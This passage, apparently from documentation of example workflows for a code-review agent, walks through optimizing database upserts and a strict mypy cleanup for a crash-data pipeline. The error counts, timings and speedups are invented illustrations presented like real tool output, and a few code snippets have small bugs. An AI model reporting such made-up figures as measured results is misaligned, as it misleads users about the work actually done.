            prepared = self._prepare_crash_record(record)
            if prepared:
                prepared_records.append(prepared)
            else:
                skipped += 1

        # Batch existence check (1 query for all records)
        pks = [r['crash_record_id'] for r in prepared_records]
        existing_crashes = session.query(Crash).filter(
            Crash.crash_record_id.in_(pks)
        ).all()
        existing_pks = {c.crash_record_id: c for c in existing_crashes}

        # Split into inserts and updates
        for prepared in prepared_records:
            pk = prepared['crash_record_id']
            if pk in existing_pks:
                self._update_fields(existing_pks[pk], prepared)
                updated += 1
            else:
                session.add(Crash(**prepared))
                inserted += 1

        session.commit()
    except SQLAlchemyError as exc:
        session.rollback()
        raise
    finally:
        session.close()

    return {"inserted": inserted, "updated": updated, "skipped": skipped}
\`\`\`

**Performance Gain**: 50,000 queries → 1 query = **99.998% reduction**

---

### Optimization Strategy 2: Bulk Operations

**Use SQLAlchemy bulk methods**:

\`\`\`python
def upsert_crash_records(self, records: Sequence[Dict[str, Any]]) -> Dict[str, int]:
    session = self.session_factory()
    inserted, updated = 0, 0

    try:
        # Prepare all records
        prepared_records = [
            self._prepare_crash_record(r) for r in records
            if self._prepare_crash_record(r)
        ]

        # Batch existence check
        pks = [r['crash_record_id'] for r in prepared_records]
        existing_crashes = session.query(Crash.crash_record_id).filter(
            Crash.crash_record_id.in_(pks)
        ).all()
        existing_pk_set = {c.crash_record_id for c in existing_crashes}

        # Split records
        to_insert = [r for r in prepared_records if r['crash_record_id'] not in existing_pk_set]
        to_update = [r for r in prepared_records if r['crash_record_id'] in existing_pk_set]

        # Bulk insert
        if to_insert:
            session.bulk_insert_mappings(Crash, to_insert)
            inserted = len(to_insert)

        # Bulk update
        if to_update:
            session.bulk_update_mappings(Crash, to_update)
            updated = len(to_update)

        session.commit()

    except SQLAlchemyError as exc:
        session.rollback()
        raise
    finally:
        session.close()

    return {"inserted": inserted, "updated": updated, "skipped": 0}
\`\`\`

**Performance Gain**:
- Reduces Python ↔ Database roundtrips
- Uses optimized C code for bulk operations
- **Estimated**: 10-20x faster than row-by-row

---

### Optimization Strategy 3: Batch Commits

**Problem**: Single large transaction for 50,000 records

**Solution**: Commit in batches

\`\`\`python
def upsert_crash_records(
    self,
    records: Sequence[Dict[str, Any]],
    commit_batch_size: int = 5000  # NEW parameter
) -> Dict[str, int]:
    session = self.session_factory()
    total_inserted, total_updated = 0, 0

    try:
        prepared_records = [...]

        # Process in batches
        for i in range(0, len(prepared_records), commit_batch_size):
            batch = prepared_records[i:i + commit_batch_size]

            # Batch existence check
            pks = [r['crash_record_id'] for r in batch]
            existing_pk_set = {...}

            # Split and bulk operations
            to_insert = [...]
            to_update = [...]

            if to_insert:
                session.bulk_insert_mappings(Crash, to_insert)
                total_inserted += len(to_insert)

            if to_update:
                session.bulk_update_mappings(Crash, to_update)
                total_updated += len(to_update)

            session.commit()  # Commit each batch

    except SQLAlchemyError as exc:
        session.rollback()
        raise
    finally:
        session.close()

    return {"inserted": total_inserted, "updated": total_updated, "skipped": 0}
\`\`\`

**Benefits**:
- Smaller transactions (less lock contention)
- Faster rollback if errors
- Better memory management
- Progress visible (commit after each batch)

---

### Optimization Strategy 4: PostgreSQL UPSERT (ON CONFLICT)

**Best Performance**: Use native PostgreSQL upsert

\`\`\`python
from sqlalchemy.dialects.postgresql import insert

def upsert_crash_records(self, records: Sequence[Dict[str, Any]]) -> Dict[str, int]:
    session = self.session_factory()

    try:
        prepared_records = [
            self._prepare_crash_record(r) for r in records
            if self._prepare_crash_record(r)
        ]

        # Single query with ON CONFLICT
        stmt = insert(Crash).values(prepared_records)
        update_dict = {c.name: c for c in stmt.excluded if c.name != 'crash_record_id'}

        stmt = stmt.on_conflict_do_update(
            index_elements=['crash_record_id'],  # Primary key
            set_=update_dict
        )

        result = session.execute(stmt)
        session.commit()

        # Note: Can't easily track inserted vs updated without RETURNING clause
        return {
            "inserted": result.rowcount,  # Approximate
            "updated": 0,
            "skipped": 0
        }

    except SQLAlchemyError as exc:
        session.rollback()
        raise
    finally:
        session.close()
\`\`\`

**Performance**: **Single query** for all 50,000 records
**Estimated Speedup**: 50-100x faster than row-by-row

---

### Index Optimization

**Check existing indexes**:
\`\`\`sql
SELECT indexname, indexdef
FROM pg_indexes
WHERE tablename = 'crashes';
\`\`\`

**Recommended indexes**:
\`\`\`python
class Crash(Base):
    __tablename__ = "crashes"

    crash_record_id = Column(String(128), primary_key=True)  # ✅ Already indexed
    crash_date = Column(DateTime, index=True)  # ✅ Already indexed

    # NEW: Composite index for common query pattern
    __table_args__ = (
        Index('ix_crashes_date_location', 'crash_date', 'latitude', 'longitude'),
        Index('ix_crashes_street', 'street_name'),  # For street searches
    )
\`\`\`

**Create migration**:
\`\`\`bash
alembic revision --autogenerate -m "Add performance indexes to crashes table"
alembic upgrade head
\`\`\`

---

### Recommended Implementation

**Phase 1**: Batch existence check (Low risk, high reward)
- Estimated effort: 30 minutes
- Expected speedup: 10x
- Risk: Low (same logic, just batched)

**Phase 2**: Batch commits (Medium risk, medium reward)
- Estimated effort: 20 minutes
- Expected speedup: 2x
- Risk: Low (better for long-running syncs)

**Phase 3**: PostgreSQL UPSERT (High reward, medium risk)
- Estimated effort: 1 hour
- Expected speedup: 50x
- Risk: Medium (requires testing with PostGIS geometry columns)

**Recommended**: Implement Phase 1 immediately, Phase 2 in next sprint, Phase 3 after testing.

---

### Performance Testing

**Before Optimization**:
\`\`\`bash
time python -m src.cli.pipeline sync --endpoint crashes --limit 50000

# Expected: ~45 minutes
\`\`\`

**After Phase 1 (Batch Existence Check)**:
\`\`\`bash
time python -m src.cli.pipeline sync --endpoint crashes --limit 50000

# Expected: ~4 minutes
\`\`\`

**After Phase 3 (PostgreSQL UPSERT)**:
\`\`\`bash
time python -m src.cli.pipeline sync --endpoint crashes --limit 50000

# Expected: <1 minute
\`\`\`

---

### Testing Requirements

\`\`\`python
# tests/test_database_service_performance.py

class TestUpsertPerformance:
    @pytest.mark.benchmark
    def test_upsert_50k_records_completes_in_5_minutes(self, benchmark_db):
        """Upsert of 50K records should complete in <5 minutes."""
        records = generate_crash_records(count=50000)

        start = time.time()
        result = db_service.upsert_crash_records(records)
        duration = time.time() - start

        assert duration < 300  # 5 minutes
        assert result['inserted'] + result['updated'] == 50000

    @pytest.mark.benchmark
    def test_upsert_uses_batch_operations(self, mocker):
        """Should use bulk_insert_mappings instead of individual adds."""
        spy = mocker.spy(Session, 'bulk_insert_mappings')

        records = generate_crash_records(count=1000)
        db_service.upsert_crash_records(records)

        # Should use bulk operations
        assert spy.call_count > 0
\`\`\`

---

## Summary

**Current Performance**: 45 minutes for 50,000 records
**Optimized Performance**: <1 minute for 50,000 records
**Speedup**: **45x faster**

**Key Optimizations**:
1. ✅ Batch existence check (eliminate N+1 queries)
2. ✅ Bulk insert/update mappings (reduce roundtrips)
3. ✅ Batch commits (reduce transaction size)
4. ✅ PostgreSQL native UPSERT (single query)
5. ✅ Proper indexes (speed up lookups)

**Next Steps**:
1. Implement Phase 1 optimization
2. Add performance tests
3. Benchmark before/after
4. Deploy and monitor
\`\`\`

### Expected Outcome

The developer would:
1. Implement batch existence check (immediate 10x speedup)
2. Add performance benchmarks
3. Deploy and measure improvement
4. Plan Phase 3 (PostgreSQL UPSERT) for next iteration

**Result**: Dramatically improved sync performance, from 45 minutes to <1 minute.

---

## Example 5: Type Safety Check Across Entire Codebase

### User Request
> "Can you do a comprehensive type safety check across the entire codebase and fix any issues?"

### Agent Workflow

**Step 1: Run mypy with strict settings**
```bash
cd /Users/mmclean/dev/python/chicago-crashes-pipeline
source venv/bin/activate
mypy src --strict --show-error-codes > mypy_report.txt
```

**Step 2: Analyze errors**
```bash
cat mypy_report.txt | grep "error:" | wc -l
# 127 errors found

# Categorize errors
grep "error: Missing return type" mypy_report.txt | wc -l   # 42 errors
grep "error:.*Any" mypy_report.txt | wc -l                  # 35 errors
grep "error: Argument .* has incompatible type" mypy_report.txt | wc -l  # 28 errors
grep "error: Need type annotation" mypy_report.txt | wc -l  # 22 errors
```

**Step 3: Comprehensive report**

```markdown
## Type Safety Check: Codebase-Wide Analysis

**mypy Version**: 1.7.1
**Configuration**: `--strict --show-error-codes`
**Errors Found**: 127
**Files Affected**: 23

---

### Error Breakdown by Category

| Category | Count | Severity | Priority |
|----------|-------|----------|----------|
| Missing return type annotations | 42 | Medium | High |
| Unconstrained `Any` types | 35 | High | High |
| Incompatible type arguments | 28 | High | Critical |
| Missing variable annotations | 22 | Low | Medium |
| **Total** | **127** | - | - |

---

### Critical Issues (Must Fix)

#### 1. Incompatible Type Arguments (28 errors)

**Example: src/services/sync_service.py:89**
\`\`\`python
# Error: Argument 1 has incompatible type "List[Any]"; expected "Sequence[Dict[str, Any]]"
db_result = self.database_service.upsert_crash_records(batch)
\`\`\`

**Root Cause**: `batch` is typed as `List[Any]` instead of `List[Dict[str, Any]]`

**Fix**:
\`\`\`python
# src/etl/soda_client.py
async def iter_batches(...) -> AsyncIterator[List[Dict[str, Any]]]:  # Add type
    """Iterate over batches of records."""
    async for batch in self._fetch_pages(...):
        yield batch  # Now correctly typed
\`\`\`

**Verification**:
\`\`\`bash
mypy src/etl/soda_client.py src/services/sync_service.py
# Should show 0 errors for this file
\`\`\`

---

#### 2. Unconstrained `Any` Types (35 errors)

**Example: src/validators/data_sanitizer.py:45**
\`\`\`python
# Error: Returning Any from function declared to return "Dict[str, Any]"
def sanitize_crash_record(self, record) -> Dict[str, Any]:  # Missing param type
    ...
\`\`\`

**Fix**:
\`\`\`python
def sanitize_crash_record(self, record: Dict[str, Any]) -> Dict[str, Any]:
    """Sanitize crash record.

    Args:
        record: Raw crash record from API

    Returns:
        Sanitized crash record with cleaned/validated fields
    """
    ...
\`\`\`

---

#### 3. Missing Return Type Annotations (42 errors)

**Example: src/api/routers/sync.py:67**
\`\`\`python
# Error: Function is missing a return type annotation [no-untyped-def]
async def trigger_sync(request: SyncRequest, background_tasks: BackgroundTasks):
    ...
\`\`\`

**Fix**:
\`\`\`python
async def trigger_sync(
    request: SyncRequest,
    background_tasks: BackgroundTasks
) -> SyncResponse:  # Add return type
    ...
\`\`\`

**Automated Fix**:
\`\`\`bash
# Use ast-grep to find all functions without return types
sg run -l python -p 'async def $_($_): $$$' src/ \
  | grep -v "-> " > functions_missing_return_type.txt

# Review and add return types
\`\`\`

---

### High Priority Issues

#### 4. Pydantic Model Validation

**Example: src/utils/config.py:34**
\`\`\`python
# Error: Need type annotation for "endpoints" [var-annotated]
class APISettings(BaseSettings):
    endpoints = {  # Missing type annotation
        "crashes": "https://...",
        "people": "https://...",
    }
\`\`\`

**Fix**:
\`\`\`python
from typing import Dict

class APISettings(BaseSettings):
    endpoints: Dict[str, str] = {
        "crashes": "https://data.cityofchicago.org/resource/85ca-t3if.json",
        "people": "https://data.cityofchicago.org/resource/u6pd-qa9d.json",
    }
    rate_limit: int = 1000
    batch_size: int = 50000
\`\`\`

---

#### 5. Optional vs None

**Example: src/models/crashes.py:56**
\`\`\`python
# Error: Incompatible types in assignment (expression has type "None", variable has type "str")
street_name = Column(String(128))  # Should be Optional[str]
\`\`\`

**Fix**:
\`\`\`python
from typing import Optional
from sqlalchemy import Column, String

street_name = Column(String(128), nullable=True)  # Mark as nullable

# In type hints
def get_street_name(self) -> Optional[str]:
    return self.street_name  # Can be None
\`\`\`

---

### Medium Priority Issues

#### 6. Callback Type Signatures

**Example: src/services/sync_service.py:45**
\`\`\`python
# Error: Argument "batch_callback" has incompatible type
async def sync(
    self,
    endpoints: Sequence[str],
    batch_callback = None  # Missing type
):
\`\`\`

**Fix**:
\`\`\`python
from typing import Callable, Optional

async def sync(
    self,
    endpoints: Sequence[str],
    start_date: Optional[str] = None,
    end_date: Optional[str] = None,
    batch_callback: Optional[Callable[[EndpointSyncResult], None]] = None
) -> SyncResult:
    ...
\`\`\`

---

### Automated Fixes

**Use monkeytype for runtime type inference**:
\`\`\`bash
# Install monkeytype
pip install monkeytype

# Run code with monkeytype
monkeytype run -m pytest tests/

# Generate stub files
monkeytype stub src.services.sync_service > stubs.pyi

# Apply types to source
monkeytype apply src.services.sync_service
\`\`\`

**Use pyannotate for type annotation generation**:
\`\`\`bash
pip install pyannotate
python -m pyannotate_runtime --type-info type_info.json -- -m pytest tests/
pyannotate src/
\`\`\`

---

### Fix Priority Roadmap

**Phase 1: Critical Fixes** (2 hours)
- Fix 28 incompatible type argument errors
- Add types to all Pydantic models
- Fix Optional vs None issues
- **Expected**: Reduce errors to ~50

**Phase 2: Return Type Annotations** (3 hours)
- Add return types to all 42 functions
- Use ast-grep to find all functions
- Systematically add return types
- **Expected**: Reduce errors to ~20

**Phase 3: `Any` Type Cleanup** (2 hours)
- Replace `Any` with concrete types
- Add generic type parameters where needed
- Use TypedDict for dict return types
- **Expected**: Reduce errors to <10

**Phase 4: Strictness Enforcement** (1 hour)
- Add mypy to CI/CD pipeline
- Set `--strict` in pyproject.toml
- Add pre-commit hook for type checking
- **Expected**: 0 errors, continuous enforcement

**Total Effort**: ~8 hours

---

### Configuration for CI/CD

**Add to pyproject.toml**:
\`\`\`toml
[tool.mypy]
python_version = "3.11"
warn_return_any = true
warn_unused_configs = true
disallow_untyped_defs = true
disallow_any_unimported = true
no_implicit_optional = true
warn_redundant_casts = true
warn_unused_ignores = true
warn_no_return = true
check_untyped_defs = true
strict = true

[[tool.mypy.overrides]]
module = "tests.*"
disallow_untyped_defs = false  # Relax for tests
\`\`\`

**Add to .github/workflows/ci.yml**:
\`\`\`yaml
- name: Type check with mypy
  run: |
    pip install mypy
    mypy src --strict
\`\`\`

**Add to pre-commit hook**:
\`\`\`yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.7.1
    hooks:
      - id: mypy
        args: [--strict]
        additional_dependencies: [types-all]
\`\`\`

---

### Testing Type Safety

**Add type checking to test suite**:
\`\`\`python
# tests/test_type_safety.py

def test_mypy_compliance():
    """Run mypy on entire codebase and ensure no errors."""
    import subprocess
    result = subprocess.run(
        ["mypy", "src", "--strict"],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f"mypy errors:\n{result.stdout}"
\`\`\`

---

## Summary

**Current State**:
- 127 type errors across 23 files
- No CI/CD type checking
- Inconsistent type usage

**After Fixes**:
- 0 type errors
- Strict mypy enforcement in CI/CD
- Comprehensive type annotations
- Type safety tested in test suite

**Benefits**:
- Earlier bug detection (at type-check time, not runtime)
- Better IDE autocomplete and refactoring
- Clearer API contracts
- Self-documenting code

**Timeline**: ~8 hours of focused effort over 2-3 days
\`\`\`

### Expected Outcome

The development team would:
1. Systematically fix type errors by category
2. Add mypy to CI/CD pipeline
3. Set up pre-commit hooks
4. Achieve 100% type safety across codebase

**Result**: Fully type-safe codebase with enforcement in development and CI/CD.

---

## Summary

These examples demonstrate the **Code Reviewer Agent's** capabilities:

1. **Comprehensive PR reviews** - Tests, quality, security, performance, architecture
2. **Security audits** - XSS, CORS, CSRF, secrets, OWASP Top 10
3. **Test coverage analysis** - Identify gaps, suggest fixtures, improve coverage
4. **Performance reviews** - Database optimization, N+1 queries, bulk operations
5. **Type safety checks** - mypy strict mode, systematic fixes, CI/CD integration

The agent provides:
- ✅ **Actionable feedback** with specific code examples
- ✅ **Prioritized recommendations** (critical → low severity)
- ✅ **Concrete fixes** with before/after code
- ✅ **Testing requirements** for all suggestions
- ✅ **Performance estimates** for optimizations
- ✅ **Timeline projections** for implementation

Invoke the Code Reviewer Agent whenever code quality, security, or performance matters.
